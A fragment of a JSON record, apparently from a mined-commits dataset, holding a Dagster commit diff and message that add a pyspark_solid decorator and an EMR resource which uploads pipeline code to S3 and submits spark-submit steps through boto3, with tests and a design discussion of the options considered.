)\n+    assert result.success\ndiff --git a\/python_modules\/libraries\/dagster-aws\/dagster_aws_tests\/emr_tests\/test_utils.py b\/python_modules\/libraries\/dagster-aws\/dagster_aws_tests\/emr_tests\/test_utils.py\nnew file mode 100644\nindex 0000000000..f23691ea3a\n--- \/dev\/null\n+++ b\/python_modules\/libraries\/dagster-aws\/dagster_aws_tests\/emr_tests\/test_utils.py\n@@ -0,0 +1,23 @@\n+from dagster_aws.emr.utils import subset_environment_dict\n+\n+\n+def test_subset_environment_dict():\n+    environment_dict = {\n+        'solids': {'blah': {'config': {'foo': 'a string', 'bar': 123}}},\n+        'resources': {\n+            'pyspark': {\n+                'config': {\n+                    'pipeline_file': 'dagster_aws_tests\/emr_tests\/test_pyspark.py',\n+                    'pipeline_fn_name': 'pipe',\n+                    'job_flow_id': 'j-272P42200OZ0Q',\n+                    'staging_bucket': 'dagster-scratch-80542c2',\n+                    'region_name': 'us-west-1',\n+                }\n+            }\n+        },\n+    }\n+    res = subset_environment_dict(environment_dict, 'blah')\n+    assert res == environment_dict\n+\n+    res = subset_environment_dict(environment_dict, 'not_here')\n+    assert res['solids'] == {}\ndiff --git a\/python_modules\/libraries\/dagster-aws\/setup.py b\/python_modules\/libraries\/dagster-aws\/setup.py\nindex acfa7dd513..892c7befed 100644\n--- a\/python_modules\/libraries\/dagster-aws\/setup.py\n+++ b\/python_modules\/libraries\/dagster-aws\/setup.py\n@@ -39,8 +39,8 @@ def _do_setup(name='dagster-aws'):\n         packages=find_packages(exclude=['test']),\n         include_package_data=True,\n         install_requires=['boto3==1.9.*', 'dagster', 'requests', 'terminaltables'],\n+        extras_require={'pyspark': ['dagster-pyspark']},\n         tests_require=['moto==1.3.*'],\n-        extras_require={':python_version<\"3\"': ['backports.tempfile']},\n         entry_points={'console_scripts': ['dagster-aws = dagster_aws.cli.cli:main']},\n         zip_safe=False,\n     )\ndiff --git a\/python_modules\/libraries\/dagster-aws\/tox.ini b\/python_modules\/libraries\/dagster-aws\/tox.ini\nindex f84b4bbfdf..bf5270ee64 100644\n--- a\/python_modules\/libraries\/dagster-aws\/tox.ini\n+++ b\/python_modules\/libraries\/dagster-aws\/tox.ini\n@@ -10,6 +10,8 @@ platform =\n deps =\n   -e ..\/..\/dagster\n   -r ..\/..\/dagster\/dev-requirements.txt\n+  -e ..\/dagster-spark\n+  -e ..\/dagster-pyspark\n   -r .\/dev-requirements.txt\n   -e .\n usedevelop = true\ndiff --git a\/python_modules\/libraries\/dagster-pyspark\/dagster_pyspark\/__init__.py b\/python_modules\/libraries\/dagster-pyspark\/dagster_pyspark\/__init__.py\nindex 5f1367b451..94eef4bb83 100644\n--- a\/python_modules\/libraries\/dagster-pyspark\/dagster_pyspark\/__init__.py\n+++ b\/python_modules\/libraries\/dagster-pyspark\/dagster_pyspark\/__init__.py\n@@ -1,10 +1,7 @@\n import os\n \n-from dagster_spark.configs_spark import spark_config\n-from dagster_spark.utils import flatten_dict\n from pyspark.rdd import RDD\n from pyspark.sql import DataFrame as NativeSparkDataFrame\n-from pyspark.sql import SparkSession\n \n from dagster import (\n     Bool,\n@@ -22,6 +19,14 @@\n from dagster.core.types import Selector, input_selector_schema, output_selector_schema\n from dagster.core.types.runtime import define_any_type\n \n+from .decorators import pyspark_solid\n+from .resources import (\n+    PySparkResourceDefinition,\n+    pyspark_resource,\n+    spark_session_from_config,\n+    spark_session_resource,\n+)\n+\n \n @input_selector_schema(\n     Selector(\n@@ -78,25 +83,6 @@ def write_rdd(context, file_type, file_options, spark_rdd):\n )\n \n \n-def spark_session_from_config(spark_conf=None):\n-    spark_conf = check.opt_dict_param(spark_conf, 'spark_conf')\n-    builder = SparkSession.builder\n-    flat = flatten_dict(spark_conf)\n-    for key, value in flat:\n-        builder = builder.config(key, value)\n-\n-    return builder.getOrCreate()\n-\n-\n-@resource({'spark_conf': spark_config()})\n-def spark_session_resource(init_context):\n-    spark = spark_session_from_config(init_context.resource_config['spark_conf'])\n-    try:\n-        yield spark\n-    finally:\n-        spark.stop()\n-\n-\n @output_selector_schema(\n     Selector(\n         {\ndiff --git a\/python_modules\/libraries\/dagster-pyspark\/dagster_pyspark\/decorators.py b\/python_modules\/libraries\/dagster-pyspark\/dagster_pyspark\/decorators.py\nnew file mode 100644\nindex 0000000000..ee8fd82c47\n--- \/dev\/null\n+++ b\/python_modules\/libraries\/dagster-pyspark\/dagster_pyspark\/decorators.py\n@@ -0,0 +1,63 @@\n+from dagster import check, solid\n+\n+\n+def pyspark_solid(\n+    name=None,\n+    description=None,\n+    input_defs=None,\n+    output_defs=None,\n+    config=None,\n+    required_resource_keys=None,\n+    metadata=None,\n+    step_metadata_fn=None,\n+    pyspark_resource_key=None,\n+):\n+    # Permit the user to provide a named pyspark resource\n+    pyspark_resource_key = check.opt_str_param(\n+        pyspark_resource_key, 'pyspark_resource_key', default='pyspark'\n+    )\n+\n+    # Expect a pyspark resource\n+    required_resource_keys = check.opt_set_param(required_resource_keys, 'required_resource_keys')\n+    required_resource_keys.add(pyspark_resource_key)\n+\n+    # nonlocal keyword not available in Python 2\n+    non_local = {'name': name, 'required_resource_keys': required_resource_keys}\n+\n+    # Handle when we're called bare without arguments (e.g. name is actually the callable, not the\n+    # solid name)\n+    if callable(name):\n+\n+        @solid(name=name.__name__, required_resource_keys=required_resource_keys)\n+        def new_compute_fn(context):\n+            return context.resources.pyspark.get_compute_fn(fn=name, solid_name=name.__name__)(\n+                context\n+            )\n+\n+        return new_compute_fn\n+\n+    def wrap(fn):\n+        name = non_local['name'] or fn.__name__\n+\n+        @solid(\n+            name=name,\n+            description=description,\n+            input_defs=input_defs,\n+            output_defs=output_defs,\n+            config=config,\n+            required_resource_keys=non_local['required_resource_keys'],\n+            metadata=metadata,\n+            step_metadata_fn=step_metadata_fn,\n+        )\n+        def new_compute_fn(context):\n+            from .resources import PySparkResourceDefinition\n+\n+            spark = check.inst(\n+                getattr(context.resources, pyspark_resource_key), PySparkResourceDefinition\n+            )\n+\n+            return spark.get_compute_fn(fn, name)(context)\n+\n+        return new_compute_fn\n+\n+    return wrap\ndiff --git a\/python_modules\/libraries\/dagster-pyspark\/dagster_pyspark\/resources.py b\/python_modules\/libraries\/dagster-pyspark\/dagster_pyspark\/resources.py\nnew file mode 100644\nindex 0000000000..fc3b956019\n--- \/dev\/null\n+++ b\/python_modules\/libraries\/dagster-pyspark\/dagster_pyspark\/resources.py\n@@ -0,0 +1,61 @@\n+import abc\n+\n+import six\n+from dagster_spark.configs_spark import spark_config\n+from dagster_spark.utils import flatten_dict\n+from pyspark.sql import SparkSession\n+\n+from dagster import check, resource\n+\n+\n+def spark_session_from_config(spark_conf=None):\n+    spark_conf = check.opt_dict_param(spark_conf, 'spark_conf')\n+    builder = SparkSession.builder\n+    flat = flatten_dict(spark_conf)\n+    for key, value in flat:\n+        builder = builder.config(key, value)\n+\n+    return builder.getOrCreate()\n+\n+\n+class PySparkResourceDefinition(six.with_metaclass(abc.ABCMeta)):\n+    def __init__(self, spark_conf):\n+        self._spark_session = spark_session_from_config(spark_conf)\n+\n+    @property\n+    def spark_session(self):\n+        return self._spark_session\n+\n+    @property\n+    def spark_context(self):\n+        return self.spark_session.sparkContext\n+\n+    def stop(self):\n+        self._spark_session.stop()\n+\n+    @abc.abstractmethod\n+    def get_compute_fn(self, fn, solid_name):\n+        pass\n+\n+\n+class SystemPySparkResource(PySparkResourceDefinition):\n+    def get_compute_fn(self, fn, solid_name):\n+        return fn\n+\n+\n+@resource({'spark_conf': spark_config()})\n+def pyspark_resource(init_context):\n+    pyspark = SystemPySparkResource(init_context.resource_config['spark_conf'])\n+    try:\n+        yield pyspark\n+    finally:\n+        pyspark.stop()\n+\n+\n+@resource({'spark_conf': spark_config()})\n+def spark_session_resource(init_context):\n+    spark = spark_session_from_config(init_context.resource_config['spark_conf'])\n+    try:\n+        yield spark\n+    finally:\n+        spark.stop()\ndiff --git a\/python_modules\/libraries\/dagster-pyspark\/dagster_pyspark_tests\/__init__.py b\/python_modules\/libraries\/dagster-pyspark\/dagster_pyspark_tests\/__init__.py\nnew file mode 100644\nindex 0000000000..e69de29bb2\ndiff --git a\/python_modules\/libraries\/dagster-pyspark\/dagster_pyspark_tests\/test_decorators.py b\/python_modules\/libraries\/dagster-pyspark\/dagster_pyspark_tests\/test_decorators.py\nnew file mode 100644\nindex 0000000000..8c8ba519b0\n--- \/dev\/null\n+++ b\/python_modules\/libraries\/dagster-pyspark\/dagster_pyspark_tests\/test_decorators.py\n@@ -0,0 +1,67 @@\n+from dagster_pyspark import pyspark_resource, pyspark_solid\n+\n+from dagster import Field, ModeDefinition, RunConfig, execute_pipeline, pipeline\n+\n+\n+def test_simple_pyspark_decorator():\n+    @pyspark_solid\n+    def pyspark_job(context):\n+        rdd = context.resources.pyspark.spark_context.parallelize(range(10))\n+        for item in rdd.collect():\n+            print(item)\n+\n+    @pipeline(mode_defs=[ModeDefinition('default', resource_defs={'pyspark': pyspark_resource})])\n+    def pipe():\n+        pyspark_job()\n+\n+    assert execute_pipeline(pipe, run_config=RunConfig(mode='default')).success\n+\n+\n+def test_named_pyspark_decorator():\n+    @pyspark_solid(name='blah', description='foo bar', config={'foo': Field(str)})\n+    def pyspark_job(context):\n+        rdd = context.resources.pyspark.spark_context.parallelize(range(10))\n+        for item in rdd.collect():\n+            print(item)\n+\n+    @pipeline(mode_defs=[ModeDefinition('default', resource_defs={'pyspark': pyspark_resource})])\n+    def pipe():\n+        pyspark_job()\n+\n+    assert execute_pipeline(\n+        pipe,\n+        environment_dict={'solids': {'blah': {'config': {'foo': 'baz'}}}},\n+        run_config=RunConfig(mode='default'),\n+    ).success\n+\n+\n+def test_default_pyspark_decorator():\n+    @pyspark_solid(pyspark_resource_key='first_pyspark')\n+    def first_pyspark_job(context):\n+        list_p = [('Michelle', 19), ('Austin', 29), ('Lydia', 35)]\n+        rdd = context.resources.first_pyspark.spark_context.parallelize(list_p)\n+        res = rdd.take(2)\n+        for name, age in res:\n+            print('%s: %d' % (name, age))\n+\n+    @pyspark_solid(pyspark_resource_key='last_pyspark')\n+    def last_pyspark_job(context):\n+        list_p = [('John', 19), ('Jennifer', 29), ('Adam', 35), ('Henry', 50)]\n+        rdd = context.resources.last_pyspark.spark_context.parallelize(list_p)\n+        res = rdd.take(2)\n+        for name, age in res:\n+            print('%s: %d' % (name, age))\n+\n+    @pipeline(\n+        mode_defs=[\n+            ModeDefinition(\n+                'default',\n+                resource_defs={'first_pyspark': pyspark_resource, 'last_pyspark': pyspark_resource},\n+            )\n+        ]\n+    )\n+    def pipe():\n+        first_pyspark_job()\n+        last_pyspark_job()\n+\n+    assert execute_pipeline(pipe, run_config=RunConfig(mode='default')).success\ndiff --git a\/python_modules\/libraries\/dagster-spark\/dagster_spark\/utils.py b\/python_modules\/libraries\/dagster-spark\/dagster_spark\/utils.py\nindex 9562480ae1..f08e55ab8c 100644\n--- a\/python_modules\/libraries\/dagster-spark\/dagster_spark\/utils.py\n+++ b\/python_modules\/libraries\/dagster-spark\/dagster_spark\/utils.py\n@@ -17,7 +17,8 @@ def _flatten_dict(d, result, key_path=None):\n                 result.append(('.'.join(new_key_path), v))\n \n     result = []\n-    _flatten_dict(d, result)\n+    if d is not None:\n+        _flatten_dict(d, result)\n     return result\n \n \n@@ -28,6 +29,10 @@ def parse_spark_config(spark_conf):\n     '''\n \n     spark_conf_list = flatten_dict(spark_conf)\n+    return format_for_cli(spark_conf_list)\n+\n+\n+def format_for_cli(spark_conf_list):\n     return list(\n         itertools.chain.from_iterable([('--conf', '{}={}'.format(*c)) for c in spark_conf_list])\n     )\n","files":{"\/.pylintrc":{"changes":[{"diff":"\n # See: https:\/\/github.com\/getsentry\/responses\/issues\/74\n [TYPECHECK]\n ignored-classes=responses\n-signature-mutators=solid,composite_solid,lambda_solid\n+signature-mutators=solid,pyspark_solid,composite_solid,lambda_solid\n \n [MASTER]\n ignore=snapshots\n\\ No newline at end of file","add":1,"remove":1,"filename":"\/.pylintrc","badparts":["signature-mutators=solid,composite_solid,lambda_solid"],"goodparts":["signature-mutators=solid,pyspark_solid,composite_solid,lambda_solid"]},{"diff":"\n # See: https:\/\/github.com\/getsentry\/responses\/issues\/74\n [TYPECHECK]\n ignored-classes=responses\n-signature-mutators=solid,composite_solid,lambda_solid\n+signature-mutators=solid,pyspark_solid,composite_solid,lambda_solid\n \n [MASTER]\n ignore=snapshots\n\\ No newline at end of file","add":1,"remove":1,"filename":"\/.pylintrc","badparts":["signature-mutators=solid,composite_solid,lambda_solid"],"goodparts":["signature-mutators=solid,pyspark_solid,composite_solid,lambda_solid"]}],"source":"\n[MESSAGES CONTROL] disable=C,R,duplicate-code,W0511,W1201,W1202,no-init [TYPECHECK] ignored-classes=responses signature-mutators=solid,composite_solid,lambda_solid [MASTER] ignore=snapshots ","sourceWithComments":"[MESSAGES CONTROL]\n\n# Enable the message, report, category or checker with the given id(s). You can\n# either give multiple identifier separated by comma (,) or put this option\n# multiple time.\n#enable=\n\n# Disable the message, report, category or checker with the given id(s). You\n# can either give multiple identifier separated by comma (,) or put this option\n# multiple time (only on the command line, not in the configuration file where\n# it should appear only once).#\n#\n# R - refactoring related checks\n# C - convention related checks\n# W0511 disable TODO warning\n# W1201, W1202 disable log format warning. False positives (I think)\n\ndisable=C,R,duplicate-code,W0511,W1201,W1202,no-init\n\n# See: https:\/\/github.com\/getsentry\/responses\/issues\/74\n[TYPECHECK]\nignored-classes=responses\nsignature-mutators=solid,composite_solid,lambda_solid\n\n[MASTER]\nignore=snapshots"}},"msg":"pyspark on EMR\n\nSummary:\n**Summary**\nPutting this up for discussion.\n\nThis is a (rough) cut at the thing @sashank, @max and I were discussing on Friday, where we use a decorator to express that a pyspark solid's compute function should behave differently when shipping compute to a remote EMR cluster.\n\n**Context**\nEMR must run pyspark workloads with `yarn` specified as the master URI. To run this way, Spark must have access to a local Hadoop\/Spark\/YARN install on the machine running `spark-submit` or calling `SparkSession.builder.getOrCreate()`, and this local installation must be properly configured with `core-site.xml`, etc. along with all other Hadoop XML files that define the DNS names and hosts in the YARN cluster.\n\nThis is easy when invoking a job directly on the EMR master (already configured), or through the EMR `boto3` APIs, but not something you can set up locally (very difficult to get everything configured correctly, and fragile).\n\nBecause of this, there isn't a way to tell EMR to \"run just this one solid\"\u2014EMR expects us to invoke `spark-submit <options> foo.py` either in a shell command on the master or via the EMR APIs, and it expects `foo.py` to be a self-contained pyspark application.\n\nGiven this, there is no obvious way to have pyspark solids structured like we've done historically, because the locally-constructed `SparkSession` won't be capable of interacting with a remote EMR cluster.\n\n**Options**\n\nWe have a few options that I can think of so far:\n\n1. Open all requisite ports between local machine and EMR cluster for Spark\/YARN\/Hadoop to communicate. This is wildly insecure (YARN has no security, anyone can then submit work to the YARN cluster)  so not a real option. This also would require all of the local Spark\/YARN\/Hadoop installation and XML configs, which is a huge burden to get configured right\u2014imagine how you'd have to reconfigure everything for every cluster you talk to in the ephemeral case.\n2. Maintain SSH tunnels between the local host running dagster and EMR cluster. This is very fragile, as the job will immediately be killed if your networking changes, and annoying to maintain healthy SSH tunnels (I've been down this route, it's a pain). Moreover, it would require configuring the local installations as in (1).\n3. Give up on the tight dagster <> pyspark integration, and just have separate orchestration and compute\u2014this is the norm today in Airflow, where you'd have a Pyspark operator that `subprocess.Popens` a `spark-submit my-pyspark-code.py`, and `my-pyspark-code.py` is a Python file that lives separately from the orchestration Python. EMR APIs effectively work the same, see an example here https:\/\/stackoverflow.com\/a\/37117296\/11295366.\n4. Structure Pyspark solids so that they execute differently on different Spark targets. Locally, we can just assume we can grab a `SparkSession` and go; for submitting the work to EMR, we should wrap execution of the solid into a separate Python file and submit ourselves as a workload to the EMR APIs. EMR expects (1) a main Python file, and (2) a zip archive of associated Python code you'd like to distribute to the Spark workers in the cluster. The EMR APIs will then effectively shell out to `spark-submit` locally on the EMR master, where the Spark installation is configured, such that instantiating a `SparkSession` will work fine.\n\n**Notes**\nThis diff implements a version of (4) above; tracking follow-up issues:\n\n~~1. The overriding of compute behavior based on where we're executing feels janky, and it feels like there's a weird mix of mode\/resource\/compute override going on here.~~\n~~2. The zip archive bundling seems prone to issues\/fragile; I'm building a zip of the Python code I find in the current directory and shipping it to S3; I worry that the `from ... import ...` to gain access to the invoking pipeline will be easy to get wrong.~~ -> will eventually support making this pluggable\n3. There's no guarantee we're going to be able to communicate back to the invoking Dagster instance on the host that kicked off the EMR job, rehydrate resources properly, or generally play nice with the rest of Dagster at all. Ideally we should probably assume we can't, and just use the EMR APIs in the invoking Dagster parent process to read back any metadata from the task execution via the EMR APIs.\n~~4. This bundles setting up the environment and execution into one step, which should be broken apart.~~\n~~5. Need to catch mode mismatches per Alex's comment~~ -> no longer an issue given the switch to resource-based implementation\n\nTest Plan: manual\n\nReviewers: alangenfeld, max, schrockn\n\nReviewed By: schrockn\n\nSubscribers: schrockn, themissinghlink, alangenfeld, max, sashank\n\nDifferential Revision: https:\/\/dagster.phacility.com\/D1349"}},"https:\/\/github.com\/merlinepedra\/DAGSTER":{"1e02665ca7b2d58f178a499e0ab7b8056a4bab52":{"url":"https:\/\/api.github.com\/repos\/merlinepedra\/DAGSTER\/commits\/1e02665ca7b2d58f178a499e0ab7b8056a4bab52","html_url":"https:\/\/github.com\/merlinepedra\/DAGSTER\/commit\/1e02665ca7b2d58f178a499e0ab7b8056a4bab52","message":"pyspark on EMR\n\nSummary:\n**Summary**\nPutting this up for discussion.\n\nThis is a (rough) cut at the thing @sashank, @max and I were discussing on Friday, where we use a decorator to express that a pyspark solid's compute function should behave differently when shipping compute to a remote EMR cluster.\n\n**Context**\nEMR must run pyspark workloads with `yarn` specified as the master URI. To run this way, Spark must have access to a local Hadoop\/Spark\/YARN install on the machine running `spark-submit` or calling `SparkSession.builder.getOrCreate()`, and this local installation must be properly configured with `core-site.xml`, etc. along with all other Hadoop XML files that define the DNS names and hosts in the YARN cluster.\n\nThis is easy when invoking a job directly on the EMR master (already configured), or through the EMR `boto3` APIs, but not something you can set up locally (very difficult to get everything configured correctly, and fragile).\n\nBecause of this, there isn't a way to tell EMR to \"run just this one solid\"\u2014EMR expects us to invoke `spark-submit <options> foo.py` either in a shell command on the master or via the EMR APIs, and it expects `foo.py` to be a self-contained pyspark application.\n\nGiven this, there is no obvious way to have pyspark solids structured like we've done historically, because the locally-constructed `SparkSession` won't be capable of interacting with a remote EMR cluster.\n\n**Options**\n\nWe have a few options that I can think of so far:\n\n1. Open all requisite ports between local machine and EMR cluster for Spark\/YARN\/Hadoop to communicate. This is wildly insecure (YARN has no security, anyone can then submit work to the YARN cluster)  so not a real option. This also would require all of the local Spark\/YARN\/Hadoop installation and XML configs, which is a huge burden to get configured right\u2014imagine how you'd have to reconfigure everything for every cluster you talk to in the ephemeral case.\n2. Maintain SSH tunnels between the local host running dagster and EMR cluster. This is very fragile, as the job will immediately be killed if your networking changes, and annoying to maintain healthy SSH tunnels (I've been down this route, it's a pain). Moreover, it would require configuring the local installations as in (1).\n3. Give up on the tight dagster <> pyspark integration, and just have separate orchestration and compute\u2014this is the norm today in Airflow, where you'd have a Pyspark operator that `subprocess.Popens` a `spark-submit my-pyspark-code.py`, and `my-pyspark-code.py` is a Python file that lives separately from the orchestration Python. EMR APIs effectively work the same, see an example here https:\/\/stackoverflow.com\/a\/37117296\/11295366.\n4. Structure Pyspark solids so that they execute differently on different Spark targets. Locally, we can just assume we can grab a `SparkSession` and go; for submitting the work to EMR, we should wrap execution of the solid into a separate Python file and submit ourselves as a workload to the EMR APIs. EMR expects (1) a main Python file, and (2) a zip archive of associated Python code you'd like to distribute to the Spark workers in the cluster. The EMR APIs will then effectively shell out to `spark-submit` locally on the EMR master, where the Spark installation is configured, such that instantiating a `SparkSession` will work fine.\n\n**Notes**\nThis diff implements a version of (4) above; tracking follow-up issues:\n\n~~1. The overriding of compute behavior based on where we're executing feels janky, and it feels like there's a weird mix of mode\/resource\/compute override going on here.~~\n~~2. The zip archive bundling seems prone to issues\/fragile; I'm building a zip of the Python code I find in the current directory and shipping it to S3; I worry that the `from ... import ...` to gain access to the invoking pipeline will be easy to get wrong.~~ -> will eventually support making this pluggable\n3. There's no guarantee we're going to be able to communicate back to the invoking Dagster instance on the host that kicked off the EMR job, rehydrate resources properly, or generally play nice with the rest of Dagster at all. Ideally we should probably assume we can't, and just use the EMR APIs in the invoking Dagster parent process to read back any metadata from the task execution via the EMR APIs.\n~~4. This bundles setting up the environment and execution into one step, which should be broken apart.~~\n~~5. Need to catch mode mismatches per Alex's comment~~ -> no longer an issue given the switch to resource-based implementation\n\nTest Plan: manual\n\nReviewers: alangenfeld, max, schrockn\n\nReviewed By: schrockn\n\nSubscribers: schrockn, themissinghlink, alangenfeld, max, sashank\n\nDifferential Revision: https:\/\/dagster.phacility.com\/D1349","sha":"1e02665ca7b2d58f178a499e0ab7b8056a4bab52","keyword":"remote code execution insecure","diff":"diff --git a\/.pylintrc b\/.pylintrc\nindex 5fb38167cd..b82f31e2cc 100644\n--- a\/.pylintrc\n+++ b\/.pylintrc\n@@ -20,7 +20,7 @@ disable=C,R,duplicate-code,W0511,W1201,W1202,no-init\n # See: https:\/\/github.com\/getsentry\/responses\/issues\/74\n [TYPECHECK]\n ignored-classes=responses\n-signature-mutators=solid,composite_solid,lambda_solid\n+signature-mutators=solid,pyspark_solid,composite_solid,lambda_solid\n \n [MASTER]\n ignore=snapshots\n\\ No newline at end of file\ndiff --git a\/python_modules\/libraries\/dagster-aws\/MANIFEST.in b\/python_modules\/libraries\/dagster-aws\/MANIFEST.in\nindex d03147cbed..9f8b39bc6d 100644\n--- a\/python_modules\/libraries\/dagster-aws\/MANIFEST.in\n+++ b\/python_modules\/libraries\/dagster-aws\/MANIFEST.in\n@@ -1,3 +1,5 @@\n recursive-include dagster_aws *.sh\n recursive-include dagster_aws *.yaml\n+recursive-include dagster_aws *.txt\n+recursive-include dagster_aws *.template\n include LICENSE\ndiff --git a\/python_modules\/libraries\/dagster-aws\/dagster_aws\/emr\/main.py.template b\/python_modules\/libraries\/dagster-aws\/dagster_aws\/emr\/main.py.template\nnew file mode 100644\nindex 0000000000..81d5243677\n--- \/dev\/null\n+++ b\/python_modules\/libraries\/dagster-aws\/dagster_aws\/emr\/main.py.template\n@@ -0,0 +1,21 @@\n+import sys\n+\n+from pyspark import SparkFiles\n+from pyspark.sql import SparkSession\n+\n+spark = SparkSession.builder.getOrCreate()\n+sc = spark.sparkContext\n+sys.path.insert(0, SparkFiles.getRootDirectory())\n+\n+from dagster import RunConfig\n+from dagster.utils.test import execute_solid_within_pipeline\n+\n+from {pipeline_file} import {pipeline_fn_name}\n+\n+if __name__ == '__main__':\n+    execute_solid_within_pipeline(\n+        {pipeline_fn_name},\n+        '{solid_name}',\n+        environment_dict={environment_dict},\n+        run_config=RunConfig(mode='{mode_name}'),\n+    )\n\\ No newline at end of file\ndiff --git a\/python_modules\/libraries\/dagster-aws\/dagster_aws\/emr\/resources.py b\/python_modules\/libraries\/dagster-aws\/dagster_aws\/emr\/resources.py\nnew file mode 100644\nindex 0000000000..5da9fe2ec7\n--- \/dev\/null\n+++ b\/python_modules\/libraries\/dagster-aws\/dagster_aws\/emr\/resources.py\n@@ -0,0 +1,237 @@\n+import os\n+\n+import boto3\n+import six\n+from botocore.exceptions import WaiterError\n+from dagster_pyspark import PySparkResourceDefinition\n+from dagster_spark.configs_spark import spark_config\n+from dagster_spark.utils import flatten_dict, format_for_cli\n+\n+from dagster import Field, check, resource\n+from dagster.core.errors import DagsterInvalidDefinitionError\n+from dagster.seven import get_system_temp_directory\n+\n+from .utils import build_main_file, build_pyspark_zip, get_install_requirements_step\n+\n+# On EMR, Spark is installed here\n+EMR_SPARK_HOME = '\/usr\/lib\/spark\/'\n+\n+\n+class EMRPySparkResource(PySparkResourceDefinition):\n+    def __init__(self, config):\n+        self.config = config\n+        self.emr_client = boto3.client('emr', region_name=self.config['region_name'])\n+        self.s3_client = boto3.client('s3', region_name=self.config['region_name'])\n+\n+        # Construct the SparkSession\n+        super(EMRPySparkResource, self).__init__(self.config.get('spark_conf'))\n+\n+    def get_compute_fn(self, fn, solid_name):\n+        '''Construct new compute function for EMR pyspark execution. In the scenario where we are\n+        running on a Dagster box, we will (1) sync the client code to an S3 staging bucket, and then\n+        (2) invoke execution via the EMR APIs.\n+\n+        On EMR, we'll just return the original solid function body to kick off normal pyspark\n+        execution. Since that will be launched on the EMR master node with YARN, it will\n+        automatically use the EMR cluster for execution.\n+        '''\n+\n+        if self.running_on_emr:\n+            return fn\n+\n+        def new_compute_fn(context):\n+            self._sync_code_to_s3(context, solid_name)\n+            step_defs = self._get_execute_steps(context, solid_name)\n+            steps = self.add_job_flow_steps(step_defs)\n+            self.wait_for_steps(context, steps['StepIds'])\n+\n+        return new_compute_fn\n+\n+    def _sync_code_to_s3(self, context, solid_name):\n+        '''Synchronize the pyspark code to an S3 staging bucket for use on EMR. Note that\n+        requirements are installed separately when a requirements.txt is provided.\n+\n+        For the zip file, consider the following toy example:\n+\n+        # Folder: my_pyspark_project\/\n+        # a.py\n+        def foo():\n+            print(1)\n+\n+        # b.py\n+        def bar():\n+            print(2)\n+\n+        # main.py\n+        from a import foo\n+        from b import bar\n+\n+        foo()\n+        bar()\n+\n+        This will zip up `my_pyspark_project\/` as `my_pyspark_project.zip`. Then, when running\n+        `spark-submit --py-files my_pyspark_project.zip main.py` on EMR this will print 1, 2.\n+\n+        Note that we also dynamically construct main.py to support targeting execution of a single\n+        solid on EMR vs. the entire pipeline.\n+        '''\n+        run_id = context.run_id\n+        main_file = os.path.join(get_system_temp_directory(), '%s-main.py' % run_id)\n+        zip_file = os.path.join(get_system_temp_directory(), '%s-pyspark.zip' % run_id)\n+\n+        try:\n+            build_main_file(\n+                main_file,\n+                mode_name=context.pipeline_run.mode,\n+                pipeline_file=self.config['pipeline_file'],\n+                solid_name=solid_name,\n+                environment_dict=context.environment_dict,\n+                pipeline_fn_name=self.config['pipeline_fn_name'],\n+            )\n+\n+            build_pyspark_zip(\n+                zip_file=zip_file,\n+                path=os.path.dirname(os.path.abspath(self.config['pipeline_file'])),\n+            )\n+\n+            self.s3_client.upload_file(\n+                zip_file, self.config['staging_bucket'], run_id + '\/pyspark.zip'\n+            )\n+            self.s3_client.upload_file(\n+                main_file, self.config['staging_bucket'], run_id + '\/main.py'\n+            )\n+\n+        finally:\n+            if os.path.exists(main_file):\n+                os.unlink(main_file)\n+            if os.path.exists(zip_file):\n+                os.unlink(zip_file)\n+\n+    def _get_execute_steps(self, context, solid_name):\n+        '''From the local Dagster instance, construct EMR steps that will kick off execution on a\n+        remote EMR cluster.\n+        '''\n+        action_on_failure = self.config['action_on_failure']\n+        staging_bucket = self.config['staging_bucket']\n+\n+        run_id = context.run_id\n+        local_root = os.path.dirname(os.path.abspath(self.config['pipeline_file']))\n+\n+        steps = []\n+\n+        # Install Python dependencies if a requirements file exists\n+        requirements_file = self.config.get('requirements_file_path')\n+        if requirements_file and not os.path.exists(requirements_file):\n+            raise DagsterInvalidDefinitionError(\n+                'The requirements.txt file that was specified does not exist'\n+            )\n+\n+        if not requirements_file:\n+            requirements_file = os.path.join(local_root, 'requirements.txt')\n+\n+        if os.path.exists(requirements_file):\n+            with open(requirements_file, 'rb') as f:\n+                python_dependencies = six.ensure_str(f.read()).split('\\n')\n+                steps.append(get_install_requirements_step(python_dependencies, action_on_failure))\n+\n+        # Execute Solid via spark-submit\n+        conf = dict(flatten_dict(self.config.get('spark_conf')))\n+        conf['spark.app.name'] = conf.get('spark.app.name', solid_name)\n+\n+        check.invariant(\n+            conf.get('spark.master', 'yarn') == 'yarn',\n+            desc='spark.master is configured as %s; cannot set Spark master on EMR to anything '\n+            'other than \"yarn\"' % conf.get('spark.master'),\n+        )\n+\n+        steps.append(\n+            {\n+                'Name': 'Execute Solid %s' % solid_name,\n+                'ActionOnFailure': action_on_failure,\n+                'HadoopJarStep': {\n+                    'Jar': 'command-runner.jar',\n+                    'Args': [\n+                        EMR_SPARK_HOME + 'bin\/spark-submit',\n+                        '--master',\n+                        'yarn',\n+                        '--deploy-mode',\n+                        conf.get('spark.submit.deployMode', 'client'),\n+                    ]\n+                    + format_for_cli(list(flatten_dict(conf)))\n+                    + [\n+                        '--py-files',\n+                        's3:\/\/%s\/%s\/pyspark.zip' % (staging_bucket, run_id),\n+                        's3:\/\/%s\/%s\/main.py' % (staging_bucket, run_id),\n+                    ],\n+                },\n+            }\n+        )\n+        return steps\n+\n+    def add_job_flow_steps(self, step_defs):\n+        '''Submit the constructed job flow steps to EMR for execution.\n+        '''\n+        return self.emr_client.add_job_flow_steps(\n+            JobFlowId=self.config['job_flow_id'], Steps=step_defs\n+        )\n+\n+    def wait_for_steps(self, context, step_ids):\n+        '''Uses the boto3 waiter to wait for job flow step completion.\n+        '''\n+        waiter = self.emr_client.get_waiter('step_complete')\n+\n+        try:\n+            context.log.info(\n+                'Waiting for steps: '\n+                + str(\n+                    self.emr_client.list_steps(\n+                        ClusterId=self.config['job_flow_id'], StepIds=step_ids\n+                    )\n+                )\n+            )\n+            for step_id in step_ids:\n+                waiter.wait(\n+                    ClusterId=self.config['job_flow_id'],\n+                    StepId=step_id,\n+                    WaiterConfig={'Delay': 5, 'MaxAttempts': 100},\n+                )\n+        except WaiterError:\n+            context.log.warning('Timed out waiting for EMR steps to finish')\n+\n+    @property\n+    def running_on_emr(self):\n+        '''Detects whether we are running on the EMR cluster\n+        '''\n+        if os.path.exists('\/mnt\/var\/lib\/info\/job-flow.json'):\n+            return True\n+        return False\n+\n+\n+@resource(\n+    {\n+        'pipeline_file': Field(str, description='Path to the file where the pipeline is defined'),\n+        'pipeline_fn_name': Field(str),\n+        